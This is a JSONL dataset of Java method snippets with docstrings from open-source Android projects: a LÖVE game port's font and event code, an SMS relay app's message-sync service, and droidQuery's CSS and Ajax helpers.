{"docstring": "/// doesn't support newlines\n", "func_signal": "public float getLineW (String text)", "code": "{\n\tfloat x = 0f;\n\tfor (int i=0;i<text.length();++i) {\n\t\tchar c = text.charAt(i);\n\t\tx += getGlyphMoveX(c);\n\t\tif (c == '\\n') return x; // early out\n\t}\n\treturn x;\n}", "path": "src\\net\\schattenkind\\androidLove\\luan\\obj\\LuanObjFont.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// ttf font\n", "func_signal": "public LuanObjFont (LuanGraphics g, String ttf_filename, int iSize) throws IOException", "code": "{ \n\tsuper(g.vm);\n\t\n\tFile ttfFile = g.vm.getStorage().forceGetFileFromLovePath(ttf_filename);\n\tFontRasterizer r = new FontRasterizer(ttfFile);\n\t\n//\t\tString glyphs = \" !\\\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\";\n\tString glyphs = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";\n\t\n\tBitmap b = r.renderBitmapFont(glyphs, iSize, 1, Color.MAGENTA, Color.TRANSPARENT, Color.WHITE);\n\t\n\tinit(g, new LuanObjImage(g, b), glyphs);\n}", "path": "src\\net\\schattenkind\\androidLove\\luan\\obj\\LuanObjFont.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// seems to be called LATE! after notifyGL, so made this an init condition\n// to avoid screensize being unavailable during love.load\n", "func_signal": "public void notifyScreenSize(float w, float h)", "code": "{\n\tLoveLog(\"notifyScreenSize:\" + w + \",\" + h);\n\tmfScreenW = w;\n\tmfScreenH = h;\n\tbInitCondition_ScreenSize = true;\n\tcheckAllInitOk();\n\tcheckGfxReinit();\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// NOTE: not related to c printf, rather wordwrap etc\n", "func_signal": "public void printf\t\t(String text, float param_x, float param_y, float limit, AlignMode align)", "code": "{\n\tif (bForceLowerCase) text = text.toLowerCase();\n\tint len = text.length();\n\tprepareBuffer(len);\n\tfloat x = param_x; // TODO: align here\n\tfloat y = param_y;\n\tboolean bAlignRecalcNeeded = true;\n\t// TODO: wrap ignores word boundaries for now, lookahead ? \n\t//~ LoveVM.LoveLog(TAG,\"printf:\"+param_x+\",\"+param_y+\",\"+limit+\",\"+Align2Text(align)+\" :\"+text); \n\tfor (int i=0;i<len;++i) {\n\t\tchar c = text.charAt(i);\n\t\tif (bAlignRecalcNeeded) {\n\t\t\tbAlignRecalcNeeded = false;\n\t\t\tif (align != AlignMode.LEFT) {\n\t\t\t\tfloat linew = getLineW((i > 0) ? text : text.substring(i)); // getLineW automatically stops at newline\n\t\t\t\t//~ LoveVM.LoveLog(TAG,\"printf:[\"+i+\"] linew=\"+linew+\",\"+Align2Text(align)+\" :\"+text); \n\t\t\t\tif (linew > limit) linew = limit; // small inaccuracy here, but shouldn't matter much\n\t\t\t\tif (align == AlignMode.RIGHT) x += (limit - linew); \n\t\t\t\tif (align == AlignMode.CENTER) x += (limit - linew)/2f; // text is in the middle between param_x and param_x+limit\n\t\t\t}\n\t\t}\n\t\t\n\t\tfloat draw_x = x;\n\t\tfloat draw_y = y;\n\t\tif (!isWhiteSpace(c)) {\n\t\t\tfloat mx = getGlyphMoveX(c);\n\t\t\tif (x + mx < param_x + limit) {\n\t\t\t\tx += mx;\n\t\t\t} else {\n\t\t\t\tdraw_x = param_x; // TODO: align here\n\t\t\t\tdraw_y = y + line_h*font_h;\n\t\t\t\tx = draw_x + mx;\n\t\t\t\ty = draw_y;\n\t\t\t\tbAlignRecalcNeeded = true;\n\t\t\t}\n\t\t} else {\n\t\t\tif (c == ' ' ) x += getGlyphMoveX(c);\n\t\t\tif (c == '\\t') x += getGlyphMoveX(c);\n\t\t\tif (c == '\\n') {\n\t\t\t\tx = param_x; // TODO: align here\n\t\t\t\ty += line_h*font_h;\n\t\t\t\tbAlignRecalcNeeded = true;\n\t\t\t}\n\t\t}\n\t\taddCharToBuffer(c,draw_x,draw_y);\n\t}\n\t// TODO: center/right align line-wise : getLineW(substr(... till next newline))\n\tdrawBuffer();\n}", "path": "src\\net\\schattenkind\\androidLove\\luan\\obj\\LuanObjFont.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// eg keyboard\n", "func_signal": "public void FireEvent(String callback,String a)", "code": "{\n\t// http://stackoverflow.com/questions/362424/accessing-constructor-of-an-anonymous-class\n\tFireEvent(new cLoveEvent() {\n\t\tString callback;\n\t\tString a;\n\t\tpublic cLoveEvent MyInit (String callback,String a) { this.callback = callback; this.a = a; return this; }\n\t\tpublic void Execute\t(LoveVM vm) {\n\t\t\ttry {\n\t\t\t\tvm.get_G().get(\"love\").get(callback).call(LuaString.valueOf(a));\n\t\t\t} catch (LuaError e) {\n\t\t\t\tvm.handleLuaError(e);\n\t\t\t}\n\t\t}\n\t}.MyInit(callback,a));\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// ***** ***** ***** ***** ***** file access functions\n", "func_signal": "private void loadConfig()", "code": "{\n\ttry {\n\t\tString confFile = \"conf.lua\";\n\n\t\tloadConfigFromFile(config, storage, confFile);\n\t\tif (storage.getFileType(confFile) == FileType.FILE) {\n\t\t\tloadFileFromSdCard(confFile);\n\t\t}\n\t} catch (Exception e) {\n\t\tLoveLogE(TAG, \"error loading config file\", e);\n\t}\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/**\n * Action bar helper code to be run in {@link Activity#onCreateOptionsMenu(android.view.Menu)}.\n *\n * NOTE: This code will mark on-screen menu items as invisible.\n */\n", "func_signal": "@Override\npublic boolean onCreateOptionsMenu(Menu menu)", "code": "{\n    // Hides on-screen action items from the options menu.\n    for (Integer id : mActionItemIds) {\n        menu.findItem(id).setVisible(false);\n    }\n    return true;\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\nprotected void onTitleChanged(CharSequence title, int color)", "code": "{\n    mActionBarHelper.onTitleChanged(title, color);\n    super.onTitleChanged(title, color);\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarActivity.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/***\n * This should be run only when our service starts, and takes care of resending any messages\n * that were queued but which we never got a reply for.  This could result in double sends\n * but that's better than leaving a message on the floor.\n */\n", "func_signal": "public void promoteErroredMessages()", "code": "{\n\tTextMessageHelper helper = getHelper();\n\t\t\n\tList<TextMessage> msgs = helper.withStatus(this.getApplicationContext(), TextMessage.OUTGOING, TextMessage.QUEUED);\n\tfor(TextMessage msg : msgs){\n\t\tmsg.status = TextMessage.ERRORED;\n\t\thelper.updateMessage(msg);\n\t\tMainActivity.updateMessage(msg);\t\t\t\n\t}\n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\nprotected void onTitleChanged(CharSequence title, int color)", "code": "{\n    TextView titleView = (TextView) mActivity.findViewById(R.id.actionbar_compat_title);\n    if (titleView != null) {\n        titleView.setText(title);\n    }\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Sends a message to our server.\n * @param msg\n */\n", "func_signal": "public void checkOutbox() throws IOException", "code": "{\n\tSharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());\n\tString updateInterval = prefs.getString(\"update_interval\", \"30000\");\n\tlong interval = Long.parseLong(updateInterval);\n\n\tString outboxURL = prefs.getString(\"outbox_url\", null);\n\tTextMessageHelper helper = getHelper();\t\t\n\t\n\t// no delivery url means we don't do anything\n\tif (outboxURL == null || outboxURL.length() == 0){\n\t\treturn;\n\t}\n\t\n\t// if our update interval is set to 0, then that means we shouldn't be checking, so skip\n\tif (interval == 0){\n\t\treturn;\n\t}\n\t\n\tLog.d(TAG, \"Outbox URL: \" + outboxURL);\n\t\n\ttry {\n\t\tString content = fetchURL(outboxURL);\n\t\t\n\t\tif (content.trim().length() > 0){\n\t\t\tJSONObject json = new JSONObject(content);\n\t\t\tJSONArray responses = json.getJSONArray(\"outbox\");\n\t\t\tfor (int i=0; i<responses.length(); i++) {\n\t\t\t\tJSONObject response = responses.getJSONObject(i);\t\t\n\t\t\t\tif (\"O\".equals(response.getString(\"direction\")) && \"Q\".equals(response.getString(\"status\"))) {\n\t\t\t\t\tString number = \"+\" + response.getString(\"contact\");\n\t\t\t\t\tString message = response.getString(\"text\");\n\t\t\t\t\tlong serverId = response.getLong(\"id\");\n\t\t\t\t\t\n\t\t\t\t\t// if this message doesn't already exist\n\t\t\t\t\tTextMessage existing = helper.withServerId(this.getApplicationContext(), serverId);\n\t\t\t\t\tif (existing == null){\n\t\t\t\t\t\tLog.d(TAG, \"New outgoing msg: \" + serverId + \": \" + message);\n\t\t\t\t\t\tTextMessage toSend = new TextMessage(number, message, serverId);\n\t\t\t\t\t\thelper.createMessage(toSend);\n\t\t\t\t\t\tsendMessage(toSend);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (existing.status == TextMessage.DONE){\n\t\t\t\t\t\t\texisting.status = TextMessage.SENT;\n\t\t\t\t\t\t\thelper.updateMessage(existing);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tLog.d(TAG, \"Ignoring message: \" + serverId + \" already queued.\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tLog.d(TAG, \"Outbox fetched from server\");\n\t} catch (HttpResponseException e){\n\t\tLog.d(TAG, \"Got Error: \"+ e.getMessage(), e);\n\t} catch (IOException e){\n\t\tthrow e;\n\t} catch (Throwable t) {\n\t\tLog.d(TAG, \"Got Error: \"+ t.getMessage(), t);\n\t}        \n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Sets up the compatibility action bar with the given title.\n */\n", "func_signal": "private void setupActionBar()", "code": "{\n    final ViewGroup actionBarCompat = getActionBarCompat();\n    if (actionBarCompat == null) {\n        return;\n    }\n\n    LinearLayout.LayoutParams springLayoutParams = new LinearLayout.LayoutParams(\n            0, ViewGroup.LayoutParams.MATCH_PARENT);\n    springLayoutParams.weight = 1;\n    \n\n    // Add Home button\n    SimpleMenu tempMenu = new SimpleMenu(mActivity);\n    SimpleMenuItem homeItem = new SimpleMenuItem(\n            tempMenu, android.R.id.home, 0, mActivity.getString(R.string.app_name));\n    homeItem.setIcon(R.drawable.ic_home);\n    addActionItemCompatFromMenuItem(homeItem);\n\n    // Add title text\n    TextView titleText = new TextView(mActivity, null, R.attr.actionbarCompatTitleStyle);\n    titleText.setLayoutParams(springLayoutParams);\n    // titleText.setText(mActivity.getTitle());\n    // Left empty to maintain the spacing between the button and the action menu\n    actionBarCompat.addView(titleText);\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\npublic void setRefreshActionItemState(boolean refreshing)", "code": "{\n    View refreshButton = mActivity.findViewById(R.id.actionbar_compat_item_refresh);\n    View refreshIndicator = mActivity.findViewById(\n            R.id.actionbar_compat_item_refresh_progress);\n\n    if (refreshButton != null) {\n        refreshButton.setVisibility(refreshing ? View.GONE : View.VISIBLE);\n    }\n    if (refreshIndicator != null) {\n        refreshIndicator.setVisibility(refreshing ? View.VISIBLE : View.GONE);\n    }\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/***\n * Goes through all our activations, retriggering syncs for all those that need to be sent.\n */\n", "func_signal": "public void requeueErroredIncoming()", "code": "{\n\tTextMessageHelper helper = getHelper();\n\tList<TextMessage> msgs = helper.withStatus(this.getApplicationContext(), TextMessage.INCOMING, TextMessage.ERRORED);\n\t\t\n\tint count = 0;\n\tfor(TextMessage msg : msgs){\n\t\tmsg.status = TextMessage.RECEIVED;\n\t\thelper.updateMessage(msg);\n\t\t\n\t\tMainActivity.updateMessage(msg);\n\t\t\n\t\tcount++;\n\t\tif (count >= 5){\n\t\t\tLog.d(TAG, \"Reprocessed five messages, skipping rest.\");\n\t\t\tbreak;\n\t\t}\n\t}\t\n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Sends all our pending outgoing messages to our server.\n */\n", "func_signal": "public void sendPendingMessagesToServer() throws IOException", "code": "{\n\tList<TextMessage> msgs = null;\n\t\n\t// first send any that haven't yet been tried\n\tTextMessageHelper helper = getHelper();\n\tmsgs = helper.withStatus(this.getApplicationContext(), TextMessage.INCOMING, TextMessage.RECEIVED);\n\tfor(TextMessage msg : msgs){\n\t\tsendMessageToServer(msg);\n\t}\n\t\n\t// then those that had an error when we tried to contact the server\n\thelper = getHelper();\n\tmsgs = helper.withStatus(this.getApplicationContext(), TextMessage.INCOMING, TextMessage.ERRORED);\n\tfor(TextMessage msg : msgs){\n\t\tsendMessageToServer(msg);\n\t}\n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Factory method for creating {@link ActionBarHelper} objects for a\n * given activity. Depending on which device the app is running, either a basic helper or\n * Honeycomb-specific helper will be returned.\n */\n", "func_signal": "public static ActionBarHelper createInstance(Activity activity)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH) {\n        return new ActionBarHelperICS(activity);\n    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {\n        return new ActionBarHelperHoneycomb(activity);\n    } else {\n        return new ActionBarHelperBase(activity);\n    }\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelper.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\nprotected void onPostCreate(Bundle savedInstanceState)", "code": "{\n    super.onPostCreate(savedInstanceState);\n    mActionBarHelper.onPostCreate(savedInstanceState);\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarActivity.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\nprotected void onCreate(Bundle savedInstanceState)", "code": "{\n    super.onCreate(savedInstanceState);\n    mActionBarHelper.onCreate(savedInstanceState);\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarActivity.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Base action bar-aware implementation for\n * {@link Activity#onCreateOptionsMenu(android.view.Menu)}.\n *\n * Note: marking menu items as invisible/visible is not currently supported.\n */\n", "func_signal": "@Override\npublic boolean onCreateOptionsMenu(Menu menu)", "code": "{\n    boolean retValue = false;\n    retValue |= mActionBarHelper.onCreateOptionsMenu(menu);\n    retValue |= super.onCreateOptionsMenu(menu);\n    return retValue;\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarActivity.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Toggles our connection from WIFI and vice versa.  If it does not and we are on WIFI, then \n * we try to switch to the mobile network.\n */\n", "func_signal": "public void toggleConnection()", "code": "{\n        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);\n\t\t\n\t// well that didn't work, let's flip our connection status, that might just help.. we sleep a bit so things can connect\n\tboolean newWifiState = !wifi.isWifiEnabled();\n\tLog.d(TAG, \"Toggling Connection: Connection test failed, flipping WIFI state to: \" + newWifiState);\n\twifi.setWifiEnabled(newWifiState);\n\t\n\t// sleep 30 seconds to give the network a chance to connect\n\ttry{\n\t\tThread.sleep(30000);\n\t} catch (Throwable tt){}\n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Trims all but the latest 100 messages in our table.\n */\n", "func_signal": "public void trimMessages()", "code": "{\n\tTextMessageHelper helper = getHelper();\n\thelper.trimMessages();\n}", "path": "src\\com\\nyaruka\\androidrelay\\RelayService.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Adds an item to the menu.  The other add methods funnel to this.\n */\n", "func_signal": "private MenuItem addInternal(int itemId, int order, CharSequence title)", "code": "{\n    final SimpleMenuItem item = new SimpleMenuItem(this, itemId, order, title);\n    mItems.add(findInsertIndex(mItems, order), item);\n    return item;\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\SimpleMenu.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Trigger a reboot tomorrow at midnight\n */\n", "func_signal": "private static void scheduleRebootService(Context context)", "code": "{\n\tIntent serviceIntent = new Intent(context, RebootService.class);\n\tPendingIntent sender = PendingIntent.getService(context, 0, serviceIntent, 0);\n\n\t// reboot each day to keep things happy\n\tAlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);\n\t\n\t// advance to tomorrow\n\tCalendar now = Calendar.getInstance();\n\tnow.add(Calendar.HOUR, 24);\n\t\n\t// floor our date\n\tint day = now.get(Calendar.DAY_OF_MONTH);\n\tint mo = now.get(Calendar.MONTH);\n\tint yr = now.get(Calendar.YEAR);\n\tnow.set(yr, mo, day, 0, 0);\n\t\n\t// set the alarm\n\tam.set(AlarmManager.RTC_WAKEUP, now.getTimeInMillis(), sender);\n}", "path": "src\\com\\nyaruka\\androidrelay\\BootStrapper.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**{@inheritDoc}*/\n", "func_signal": "@Override\npublic void onPostCreate(Bundle savedInstanceState)", "code": "{\n    mActivity.getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE,\n            R.layout.actionbar_compat);\n    setupActionBar();\n\n    SimpleMenu menu = new SimpleMenu(mActivity);\n    mActivity.onCreatePanelMenu(Window.FEATURE_OPTIONS_PANEL, menu);\n    mActivity.onPrepareOptionsMenu(menu);\n    for (int i = 0; i < menu.size(); i++) {\n        MenuItem item = menu.getItem(i);\n        if (mActionItemIds.contains(item.getItemId())) {\n            addActionItemCompatFromMenuItem(item);\n        }\n    }\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Adds an action button to the compatibility action bar, using menu information from a {@link\n * android.view.MenuItem}. If the menu item ID is <code>menu_refresh</code>, the menu item's\n * state can be changed to show a loading spinner using\n * {@link com.nyaruka.android.actionbarcompat.ActionBarHelperBase#setRefreshActionItemState(boolean)}.\n */\n", "func_signal": "private View addActionItemCompatFromMenuItem(final MenuItem item)", "code": "{\n    final int itemId = item.getItemId();\n\n    final ViewGroup actionBar = getActionBarCompat();\n    if (actionBar == null) {\n        return null;\n    }\n\n    // Create the button\n    ImageButton actionButton = new ImageButton(mActivity, null,\n            itemId == android.R.id.home\n                    ? R.attr.actionbarCompatItemHomeStyle\n                    : R.attr.actionbarCompatItemStyle);\n    actionButton.setLayoutParams(new ViewGroup.LayoutParams(\n            (int) mActivity.getResources().getDimension(\n                    itemId == android.R.id.home\n                            ? R.dimen.actionbar_compat_button_home_width\n                            : R.dimen.actionbar_compat_button_width),\n            ViewGroup.LayoutParams.FILL_PARENT));\n    if (itemId == R.id.menu_refresh) {\n        actionButton.setId(R.id.actionbar_compat_item_refresh);\n    }\n    actionButton.setImageDrawable(item.getIcon());\n    actionButton.setScaleType(ImageView.ScaleType.CENTER);\n    actionButton.setContentDescription(item.getTitle());\n    actionButton.setOnClickListener(new View.OnClickListener() {\n        public void onClick(View view) {\n            mActivity.onMenuItemSelected(Window.FEATURE_OPTIONS_PANEL, item);\n        }\n    });\n\n    actionBar.addView(actionButton);\n\n    if (item.getItemId() == R.id.menu_refresh) {\n        // Refresh buttons should be stateful, and allow for indeterminate progress indicators,\n        // so add those.\n        ProgressBar indicator = new ProgressBar(mActivity, null,\n                R.attr.actionbarCompatProgressIndicatorStyle);\n\n        final int buttonWidth = mActivity.getResources().getDimensionPixelSize(\n                R.dimen.actionbar_compat_button_width);\n        final int buttonHeight = mActivity.getResources().getDimensionPixelSize(\n                R.dimen.actionbar_compat_height);\n        final int progressIndicatorWidth = buttonWidth / 2;\n\n        LinearLayout.LayoutParams indicatorLayoutParams = new LinearLayout.LayoutParams(\n                progressIndicatorWidth, progressIndicatorWidth);\n        indicatorLayoutParams.setMargins(\n                (buttonWidth - progressIndicatorWidth) / 2,\n                (buttonHeight - progressIndicatorWidth) / 2,\n                (buttonWidth - progressIndicatorWidth) / 2,\n                0);\n        indicator.setLayoutParams(indicatorLayoutParams);\n        indicator.setVisibility(View.GONE);\n        indicator.setId(R.id.actionbar_compat_item_refresh_progress);\n        actionBar.addView(indicator);\n    }\n\n    return actionButton;\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Loads action bar metadata from a menu resource, storing a list of menu item IDs that\n * should be shown on-screen (i.e. those with showAsAction set to always or ifRoom).\n * @param menuResId\n */\n", "func_signal": "private void loadActionBarMetadata(int menuResId)", "code": "{\n    XmlResourceParser parser = null;\n    try {\n        parser = mActivity.getResources().getXml(menuResId);\n\n        int eventType = parser.getEventType();\n        int itemId;\n        int showAsAction;\n\n        boolean eof = false;\n        while (!eof) {\n            switch (eventType) {\n                case XmlPullParser.START_TAG:\n                    if (!parser.getName().equals(\"item\")) {\n                        break;\n                    }\n\n                    itemId = parser.getAttributeResourceValue(MENU_RES_NAMESPACE,\n                            MENU_ATTR_ID, 0);\n                    if (itemId == 0) {\n                        break;\n                    }\n\n                    showAsAction = parser.getAttributeIntValue(MENU_RES_NAMESPACE,\n                            MENU_ATTR_SHOW_AS_ACTION, -1);\n                    if (showAsAction == MenuItem.SHOW_AS_ACTION_ALWAYS ||\n                            showAsAction == MenuItem.SHOW_AS_ACTION_IF_ROOM) {\n                        mActionItemIds.add(itemId);\n                    }\n                    break;\n\n                case XmlPullParser.END_DOCUMENT:\n                    eof = true;\n                    break;\n            }\n\n            eventType = parser.next();\n        }\n    } catch (XmlPullParserException e) {\n        throw new InflateException(\"Error inflating menu XML\", e);\n    } catch (IOException e) {\n        throw new InflateException(\"Error inflating menu XML\", e);\n    } finally {\n        if (parser != null) {\n            parser.close();\n        }\n    }\n}", "path": "src\\com\\nyaruka\\android\\actionbarcompat\\ActionBarHelperBase.java", "repo_name": "nyaruka/android-sms-relay", "stars": 85, "license": "other", "language": "java", "size": 1320}
{"docstring": "/**\n * Most efficient way to apply the CSS one time. This uses the css parser's stream parsing ability\n * to optimize performance\n * @param droidQuery\n * @param in\n */\n", "func_signal": "public static void applyCSS(final $ droidQuery, InputStream in)", "code": "{\n\t//TODO: make this the only way to apply CSS\n\t\n\t//This may be the best way to handle things like keyframe animation, since it would require keeping\n\t//track of one animation at a time - so the current animation-name is only for the current element(s)\n\t\n\t//it is also more efficient.\n\t//THIS COULD ALSO BE DONE IN A SEPARATE THREAD!!!!\n\t\n\tfinal Handler ui = new Handler();\n\tCSSHandler handler = new AsyncCSSHandler(droidQuery, ui);\n\tAsyncCSSParser parser = new AsyncCSSParser(in, handler);\n\tparser.execute();\n\t\n\t\n}", "path": "droidQuery\\src\\self\\philbrown\\css\\StyleSheet.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Parses the HTTP response as a Script, then runs it.\n * @param connection the response to parse\n * @return a ScriptResponse Object containing the output String, if any, as well as the original\n * Script\n */\n", "func_signal": "private ScriptResponse parseScript(HttpURLConnection connection) throws ClientProtocolException, IOException", "code": "{\n\tif (options.context() != null)\n\t{\n\t\tScriptResponseHandler handler = new ScriptResponseHandler(options.context());\n\t\treturn handler.handleResponse(connection);\n\t}\n\telse\n\t{\n\t\tthrow new NullPointerException(\"No context provided.\");\n\t}\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Parses the HTTP response as Text\n * @param stream the current connection to parse\n * @return a String response\n */\n", "func_signal": "public static String parseText(InputStream stream) throws ClientProtocolException, IOException", "code": "{\t\t\n\tBufferedReader br = new BufferedReader(new InputStreamReader(stream));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = br.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        br.close();\n\treturn sb.toString();\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Apply selector to the given view. This is not recursive.\n * @param v\n * @param properties\n */\n", "func_signal": "public static void applyProperties($ droidQuery, List<Declaration> declarations)", "code": "{\n\t//apply actual css properties (big step here)\n\tfor (int i = 0; i < declarations.size(); i++)\n\t{\n\t\tDeclaration prop = declarations.get(i);\n\t\tfinal TokenSequence property = prop.getProperty();\n\t\tfinal TokenSequence value = prop.getValue();\n\t\tfinal AnimationOptions animation = new AnimationOptions();\n\t\t//FIXME: this does not seem optimal!\n\t\tdroidQuery.each(new Function() {\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void invoke($ droidQuery, Object... params) {\n\t\t\t\t\n\t\t\t\ttry\n\t\t\t\t{\n\t\t\t\t\t//these methods must be propert($, value)\n\t\t\t\t\tString key = property.toString().replace(\"-\", \"_\");\n\t\t\t\t\tif (key.equalsIgnoreCase(\"float\"))\n\t\t\t\t\t\tkey = \"_float\";\n\t\t\t\t\tObject result = methods.get(key).invoke(null, droidQuery, value);\n\t\t\t\t\tif (property.startsWith(\"animation\"))\n\t\t\t\t\t{\n\t\t\t\t\t\t//animation.\n\t\t\t\t\t\t//result will be AnimationOptions method?\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcatch (Throwable t)\n\t\t\t\t{\n\t\t\t\t\tLog.w(\"CSS\", String.format(Locale.US, \"Could not set property named %s with value %s!\", property, value), t);\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n}", "path": "droidQuery\\src\\self\\philbrown\\css\\StyleSheet.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Parses the HTTP response as a raw byte[]\n * @param response the response to parse\n * @return a byte[] response\n */\n", "func_signal": "public static byte[] parseRawContent(HttpURLConnection connection) throws IOException", "code": "{\n\tInputStream is = connection.getInputStream();\n\tBufferedReader br = new BufferedReader(new InputStreamReader(is));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = br.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        br.close();\n        is.close();\n\treturn sb.toString().getBytes();\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Recursively apply rules to view and subviews\n * @param layout\n * @param rules\n * @see CSSSelector\n */\n", "func_signal": "public void applyRules(View layout)", "code": "{\n\t//clean approach using CSSSelector.java\n\t\n\tfor (int i = 0; i < rules.size(); i++)\n\t{\n\t\tRuleSet rule = rules.get(i);\n\t\tTokenSequence selector = rule.getSelector();\n\t\tCSSSelector cssSelector = new CSSSelector();\n\t\t$ d = cssSelector.makeSelection(layout, selector);\n\t\tList<Declaration> declarations = rule.getDeclarationBlock();\n\t\tapplyProperties(d, declarations);\n\t}\n}", "path": "droidQuery\\src\\self\\philbrown\\css\\StyleSheet.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
